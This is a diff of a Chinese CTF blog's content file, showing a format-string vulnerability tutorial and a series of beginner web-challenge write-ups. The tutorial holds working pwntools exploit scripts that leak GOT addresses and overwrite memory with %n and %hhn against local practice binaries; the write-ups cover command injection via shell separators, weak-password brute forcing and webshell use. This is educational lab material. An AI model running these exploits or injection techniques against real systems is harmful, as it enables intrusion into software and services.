+<li>利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。</li>
+<li>利用 %s 来获取变量所对应地址的内容，只不过有零截断。</li>
+<li>利用 %order$x 来获取指定参数的值，利用 %order$s 来获取指定参数对应地址的内容。</li>
+</ol>
+</blockquote>
+<h3 id="泄露任意地址内存"><a class="header-anchor" href="#泄露任意地址内存">¶</a>泄露任意地址内存</h3>
+<p>上述讲了泄露栈上的变量值，下面讲如何泄露变量的地址。如果我们知道格式化字符串在输出函数调用时是第几个参数，就可以通过<code>addr%k$s</code>的办法来获取指定地址 addr 的内容（这里的 k 指第 k 个参数）<br>
+我们可以通过如下形式进行枚举</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aaaa%p--%p--%p--%p--%p--%p--%p--%p--%p--%p--</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E6%B3%84%E9%9C%B2%E5%86%85%E5%AD%98/7021GVY_U%5DLJ5B%60WMFWN80U.png" alt=""><br>
+可以看到 aaaa 对应的 0x61616161 在第四个位置上，也就是格式化字符串的第四个参数，我们知道是第几个参数之后就可以用<code>aaaa%4$p</code>来指定，如果这里我们传的是某个函数的got地址，那么就可以打印出函数在内存中的真实地址<br>
+我们使用<code>objdump -R example1</code>来查看该程序got表<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E6%B3%84%E9%9C%B2%E5%86%85%E5%AD%98/3%405HHY9%25Y9S%40%2901M1%5BL%25W%60W.png" alt=""><br>
+我们以 scanf 为例，写exp打印 scanf 函数的真实地址</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./example1&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./example1&quot;</span>)</span><br><span class="line">elf_got = elf.got[<span class="string">&#x27;__isoc99_scanf&#x27;</span>]</span><br><span class="line">payload = p32(elf_got) + <span class="string">&quot;%4$s&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;%4$s\n&#x27;</span>)</span><br><span class="line">success(hex(u32(p.recv()[<span class="number">4</span>:<span class="number">8</span>])))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="覆盖内存"><a class="header-anchor" href="#覆盖内存">¶</a>覆盖内存</h2>
+<h3 id="覆盖栈内存"><a class="header-anchor" href="#覆盖栈内存">¶</a>覆盖栈内存</h3>
+<p>覆盖栈内存我们一般用到的是<code>%n</code>，只要变量对应地址可写，我们就可以通过格式化字符串来改变其对应的值<br>
+利用步骤如下</p>
+<blockquote>
+<p>1、确定覆盖地址<br>
+2、确定相对偏移<br>
+3、进行覆盖</p>
+</blockquote>
+<p>我们继续以一个程序为例</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> a = <span class="number">123</span>, b = <span class="number">456</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> c = <span class="number">789</span>;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, &amp;c);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="number">16</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified c.&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified a for a small number.&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b == <span class="number">0x12345678</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified b for a big number!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译程序：<code>gcc -m32 -fno-stack-protector -no-pie example2.c -o example2</code><br>
+我们可以通过之前说的办法来确定相对偏移，可以看到是格式化字符串的第六个参数<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E8%A6%86%E7%9B%96%E5%86%85%E5%AD%98/H%7B5KY%29Q%5DF73Y_%7BON486%24LCH.png" alt=""><br>
+首先，例如我们知道 <strong>c</strong> 的地址为<code>0xffc25b0c</code>，为4字节，要想满足<code>if (c == 16)</code>还需要12个字节<br>
+编写exp</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; process(&quot;.&#x2F;example2&quot;)</span><br><span class="line">c_addr &#x3D; int(p.recvuntil(&#39;\n&#39;),16)</span><br><span class="line">success(hex(c_addr))</span><br><span class="line">payload &#x3D; p32(c_addr) + &#39;a&#39;*12 + &#39;%6$n&#39;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">print p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E8%A6%86%E7%9B%96%E5%86%85%E5%AD%98/M1TR56VM%5BGHTG%40I%5BFX4QQSA.png" alt=""><br>
+成功进入第一个if判断</p>
+<h3 id="覆盖任意地址内存"><a class="header-anchor" href="#覆盖任意地址内存">¶</a>覆盖任意地址内存</h3>
+<h4 id="覆盖小数字"><a class="header-anchor" href="#覆盖小数字">¶</a>覆盖小数字</h4>
+<p>这里需要我们从4字节(32位程序地址是4字节)变成2字节，也就是覆盖成小数字。如果像我们之前的做法，把地址放在前面，后面无论加什么都是比4大于的数，所以我们换成另一种策略，即使用<code>aa%k$nxx</code>的形式（这里xx是要补齐，32位程序中必须是4的倍数）</p>
+<p>我们前面已经知道相对偏移是第六，也就是这里<code>aa%k</code>是第六个参数，而后面的<code>$nxx</code>需要往后加一也就是第七个参数，再加上我们想要修改的地址<code>addr</code>就是第八个参数，所以我们 k 要取 8，exp如下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./example2&quot;</span>)</span><br><span class="line">a_addr = <span class="number">0x0804A024</span></span><br><span class="line">payload = <span class="string">&#x27;aa%8$naa&#x27;</span> + p32(a_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>上面 a 的地址可以去 ida 中查看<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E8%A6%86%E7%9B%96%E5%86%85%E5%AD%98/V975D7%5D%5B8XKYL_OJ%7BU%5B4XR2.png" alt=""></p>
+<h4 id="覆盖大数字"><a class="header-anchor" href="#覆盖大数字">¶</a>覆盖大数字</h4>
+<p>接下来到覆盖大数字，按照前面的办法我们可以一次性输出大数字字节来进行覆盖，但是这样基本不会成功，因为太长了，所以我们需要另辟蹊径。首先我们需要了解一下变量在内存中的存储格式</p>
+<blockquote>
+<p>首先，所有的变量在内存中都是以字节进行存储的。<br>
+此外，在 x86 和 x64 的体系结构中，变量的存储格式为以小端存储，即最低有效位存储在低地址。举个例子，0x12345678 在内存中由低地址到高地址依次为 \ x78\x56\x34\x12。</p>
+</blockquote>
+<p>所以我们想要覆盖成<code>0x12345678</code>，需要依次为<code>\ x78\x56\x34\x12</code><br>
+接下来我们需要利用到以下字符串格式标志</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hhn : 写入一字节</span><br><span class="line">hn  : 写入两字节</span><br><span class="line">l   : 写入四节写</span><br><span class="line">ll  : 写入八字节</span><br></pre></td></tr></table></figure>
+<p>也就是我们需要使用 hhn 一个字节来逐次写入，再配合<code>%nx</code>会返回16进制数来构造exp</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./example2&quot;</span>)</span><br><span class="line">b_addr = <span class="number">0x0804A028</span></span><br><span class="line">payload1 = p32(b_addr) + p32(b_addr+<span class="number">1</span>) + p32(b_addr+<span class="number">2</span>) + p32(b_addr+<span class="number">3</span>)</span><br><span class="line">payload2 = <span class="string">&#x27;%104x&#x27;</span> + <span class="string">&#x27;%6$hhn&#x27;</span> + <span class="string">&#x27;%222x&#x27;</span> + <span class="string">&#x27;%7$hhn&#x27;</span> + <span class="string">&#x27;%222x&#x27;</span> + <span class="string">&#x27;%8$hhn&#x27;</span> + <span class="string">&#x27;%222x&#x27;</span> + <span class="string">&#x27;%9$hhn&#x27;</span></span><br><span class="line">payload = payload1 + payload2</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>解析：payload1加起来是16字节，16+104 =120，120转成16进制就是78，120+222=342,342转成16进制就是156，取一字节56，后面依次类推</p>
+<p>这里 pwntools 自带了一个好用的函数<code>fmtstr_payload</code>，exp可以简化为</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./example2&quot;</span>)</span><br><span class="line">b_addr = <span class="number">0x0804A028</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>, &#123;<span class="number">0x804A028</span>:<span class="number">0x12345678</span>&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E8%A6%86%E7%9B%96%E5%86%85%E5%AD%98/%40%5B16N9QHF8S%7BYGAF32%7BOF03.png" alt=""></p>
+<h2 id="格式化字符串盲打"><a class="header-anchor" href="#格式化字符串盲打">¶</a>格式化字符串盲打</h2>
+<h3 id="fmt-blind-stack"><a class="header-anchor" href="#fmt-blind-stack">¶</a>fmt_blind_stack</h3>
+<p>原理是在栈上，不断地去读数据就能得到 flag</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;error&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">payload</span>):</span></span><br><span class="line">    sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">8887</span>)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    data = sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> data.startswith(<span class="string">&#x27;0x&#x27;</span>):</span><br><span class="line">        <span class="keyword">print</span> p64(int(data, <span class="number">16</span>))</span><br><span class="line">    sh.close()</span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    payload = <span class="string">&#x27;%&#123;&#125;$p&#x27;</span>.format(i)</span><br><span class="line">    leak(payload)</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<h2 id="结语"><a class="header-anchor" href="#结语">¶</a>结语</h2>
+<p>up！up！up！</p>
+<blockquote>
+<p>参考链接：<br>
+<a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/</a><br>
+<a href="https://www.yuque.com/hxfqg9/bin/aedgn4">https://www.yuque.com/hxfqg9/bin/aedgn4</a></p>
+</blockquote>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
   </entry>
   <entry>
     <title>sqlmap-tamper编写初体验</title>
@@ -1675,8 +1845,6 @@ index.php</p>
     <title>攻防世界Web区~持续更新中！</title>
     <url>/posts/14571/</url>
     <content><![CDATA[<h1>新手练习区</h1>
-<ul>
-<li>
 <h2 id="view-source"><a class="header-anchor" href="#view-source">¶</a>view source</h2>
 <hr>
 <p><img src="https://blog-file-1302856486.file.myqcloud.com/NE96%7DBO%60EX%28%5B%40YGU%25FPT%29I3.png" alt=""></p>
@@ -1685,8 +1853,6 @@ index.php</p>
 <p><img src="https://blog-file-1302856486.file.myqcloud.com/%242%29AW49Y%5BP5%407W%7BM8%7D%25S%40%25R.png" alt=""></p>
 <br>
 <p>flag就藏在源代码里，我们操练起cv大法，然后提交拿分~~~</p>
-</li>
-<li>
 <h2 id="robots"><a class="header-anchor" href="#robots">¶</a>robots</h2>
 <hr>
 <p><img src="https://blog-file-1302856486.file.myqcloud.com/_6%5D5%7B%7DXV%29FML%60R14%7DQMV9N4.png" alt=""></p>
@@ -1701,8 +1867,6 @@ index.php</p>
 <p><img src="https://blog-file-1302856486.file.myqcloud.com/%7BQ%25D9C7260DI5L%5BSMIY8X2G.png" alt=""></p>
 <br>
 <p>即可拿到flag呦~</p>
-</li>
-<li>
 <h2 id="backup"><a class="header-anchor" href="#backup">¶</a>backup</h2>
 <hr>
 <p><img src="https://blog-file-1302856486.file.myqcloud.com/4VR%40591%60F0%7D%5BYOQ%40X5%5D%7BYEF.png" alt=""></p>
@@ -1715,8 +1879,6 @@ index.php</p>
 <p>本题也可使用目录遍历搜索</p>
 <p><img src="https://blog-file-1302856486.file.myqcloud.com/Y2LMCC%25TTM%5D%7BJ474Q3N42%5BD.png" alt=""></p>
 <p>感觉自己是不是有点厉害了现在,操练起兵器，我们继续闯关，冲冲冲~</p>
-</li>
-<li>
 <h2 id="cookie"><a class="header-anchor" href="#cookie">¶</a>cookie</h2>
 <hr>
 <p>此关提示我们信息在cookie中</p>
@@ -1732,8 +1894,6 @@ index.php</p>
 <p><img src="https://blog-file-1302856486.file.myqcloud.com/9W43RJ_R%25UC%7D3W%408%28%24DROGI.png" alt=""></p>
 <br>
 <p>flag就出现在了我们面前，金币++，开心~</p>
-</li>
-<li>
 <h2 id="disabled-button"><a class="header-anchor" href="#disabled-button">¶</a>disabled_button</h2>
 <hr>
 <p>题目提示页面按钮不能打开，点击了发现确实打不开</p>
@@ -1745,8 +1905,6 @@ index.php</p>
 <br>
 <p>点击后，flag就出现啦~</p>
 <p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/disabled_button/17LAH%25%7B9QR%60%7DB%24F%7BSGZ5BMD.png" alt=""></p>
-</li>
-<li>
 <h2 id="weak-auth"><a class="header-anchor" href="#weak-auth">¶</a>weak_auth</h2>
 <hr>
 <p>本题提示为弱密码爆破</p>
@@ -1759,8 +1917,6 @@ index.php</p>
 <p>我们使用字典配合burpsuite进行一个爆破，最后得到结果~，在响应包里拿到flag</p>
 <p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/weak_auth/VD2TF%7BN%5DP%60F47D%40%7DZI9%60EG8.png" alt=""></p>
 <p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/weak_auth/NA9%25KLH%29H95R14I0E%28%243X46.png" alt=""></p>
-</li>
-<li>
 <h2 id="command-execution"><a class="header-anchor" href="#command-execution">¶</a>command_execution</h2>
 <hr>
 <p>本题给了我们一个ping页面，我们尝试ping了本机地址之后回显信息</p>
@@ -1778,15 +1934,42 @@ index.php</p>
 <p>轻轻松松获得flag咯~</p>
 <br>
 <p><strong>扩充知识：</strong></p>
-<p>| <strong>常见连接符</strong> | <strong>举例</strong> | <strong>效果</strong>                    |<br>
-| -------------- | -------- | --------------------------- |<br>
-| ;              | A;B      | 先执行A，再执行B            |<br>
-| &amp;              | A&amp;B      | 简单拼接，A B之间无制约关系 |<br>
-| |             | A|B     | 显示B的执行结果             |<br>
-| &amp;&amp;             | A&amp;&amp;B     | A执行成功，然后才会执行B    |<br>
-| ||           | A||B   | A执行失败，然后才会执行B    |</p>
-</li>
-<li>
+<table>
+<thead>
+<tr>
+<th><strong>常见连接符</strong></th>
+<th><strong>举例</strong></th>
+<th><strong>效果</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>;</td>
+<td>A;B</td>
+<td>先执行A，再执行B</td>
+</tr>
+<tr>
+<td>&amp;</td>
+<td>A&amp;B</td>
+<td>简单拼接，A B之间无制约关系</td>
+</tr>
+<tr>
+<td>|</td>
+<td>A|B</td>
+<td>显示B的执行结果</td>
+</tr>
+<tr>
+<td>&amp;&amp;</td>
+<td>A&amp;&amp;B</td>
+<td>A执行成功，然后才会执行B</td>
+</tr>
+<tr>
+<td>||</td>
+<td>A||B</td>
+<td>A执行失败，然后才会执行B</td>
+</tr>
+</tbody>
+</table>
 <h2 id="simple-php"><a class="header-anchor" href="#simple-php">¶</a>simple_php</h2>
 <hr>
 <p>本题需要我们掌握php弱类型比较，打开环境给出我们一些源码</p>
@@ -1805,8 +1988,6 @@ index.php</p>
 <p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/simple_php/DE5%7D3O9%5B%40%40BTDQN%25O%5BSF%7BXU.png" alt=""></p>
 <br>
 <p>如此，取flag如探囊取物~</p>
-</li>
-<li>
 <h2 id="get-post"><a class="header-anchor" href="#get-post">¶</a>get_post</h2>
 <hr>
 <p>这道题很简单，就是让我们发送get请求和post请求。</p>
@@ -1820,8 +2001,6 @@ index.php</p>
 <p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/get_post/H6LU%60WBN%5DX2ZGGFUCM3~60V.png" alt=""></p>
 <br>
 <p>返回的结果中含有flag，ok，此题通关！</p>
-</li>
-<li>
 <h2 id="xff-referer"><a class="header-anchor" href="#xff-referer">¶</a>xff_referer</h2>
 <hr>
 <p>题目告诉我们是xff_referer，猜测是与xff和referer相关，打开环境看看</p>
@@ -1840,8 +2019,6 @@ index.php</p>
 <p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/xff_referer/6TO%40YJZ5U~~H1O_Z3%40%24X%7DP5.png" alt=""></p>
 <p>发现响应包里含有flag，成功！这道题还可以使用我们强大的curl命令行工具</p>
 <p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/xff_referer/M9MHWII6E%2841I0Y8Z%7BB%7DQPW.png" alt=""></p>
-</li>
-<li>
 <h2 id="webshell"><a class="header-anchor" href="#webshell">¶</a>webshell</h2>
 <hr>
 <p>这道题考的是webshell，诶，你不知道什么是webshell吗？webshell就是web下的shell ，也就是web网站的后门。</p>
@@ -1855,8 +2032,6 @@ index.php</p>
 <p>然后连接到后台，在里面找到flag文件，打开获取flag即可~</p>
 <p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/webshell/%5DS%244%25EXCQ1PS03D%5B%7DCP5%7DDL.png" alt=""></p>
 <p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/webshell/Z5%25II2N4%254R~%29R8DY~%405AN4.png" alt=""></p>
-</li>
-<li>
 <h2 id="simple-js"><a class="header-anchor" href="#simple-js">¶</a>simple_js</h2>
 <hr>
 <p>打开题目，题目名字告诉我们和js有关，这让我着实慌了一会，因为我对js没有怎么去学过。</p>
@@ -1869,13 +2044,9 @@ index.php</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x=[<span class="number">70</span>,<span class="number">65</span>,<span class="number">85</span>,<span class="number">88</span>,<span class="number">32</span>,<span class="number">80</span>,<span class="number">65</span>,<span class="number">83</span>,<span class="number">83</span>,<span class="number">87</span>,<span class="number">79</span>,<span class="number">82</span>,<span class="number">68</span>,<span class="number">32</span>,<span class="number">72</span>,<span class="number">65</span>,<span class="number">72</span>,<span class="number">65</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">    print(chr(i),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
 <p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/simple_js/SD%28%5D9%60%7BB%25WGN1%5DS2_%288H8JT.png" alt=""></p>
 <p>解码得到弹框的提示消息，那我们再解一下下面那一串</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">string = <span class="string">&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;</span></span><br><span class="line">  s_list = string.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> s_list:</span><br><span class="line">      i = chr(int(i))</span><br><span class="line">      res += i</span><br><span class="line">  print(res)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">string = <span class="string">&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;</span></span><br><span class="line">s_list = string.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s_list:</span><br><span class="line">    i = chr(int(i))</span><br><span class="line">    res += i</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
 <p>看起来不像是什么加密的结构，这让我有点迷。淦，忽然想起来前面题目开始就提示我们flga结构，于是拿着字符串去构造了一下flag提交，Cyberpeace{786OsErtk12}，发现居然成功了~</p>
-</li>
-</ul>
 <h1>高手进阶区</h1>
-<ul>
-<li>
 <h2 id="baby-web"><a class="header-anchor" href="#baby-web">¶</a>baby_web</h2>
 <hr>
 <p>有点激动，终于到高手web进阶区了，慢慢走向高手的路了是不是？好吧好吧，不吹了，来看看题目</p>
@@ -1887,8 +2058,6 @@ index.php</p>
 <p>flag就出来了，妥妥的签到题呀哈哈嗝。</p>
 <p>后来发现其实刚开始就已经给出flag了，汗！</p>
 <p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/baby_web/YY4%24SZRJG~%7DGSJ%5DHWPE~6XO.png" alt=""></p>
-</li>
-</ul>
 ]]></content>
       <tags>
         <tag>CTF</tag>
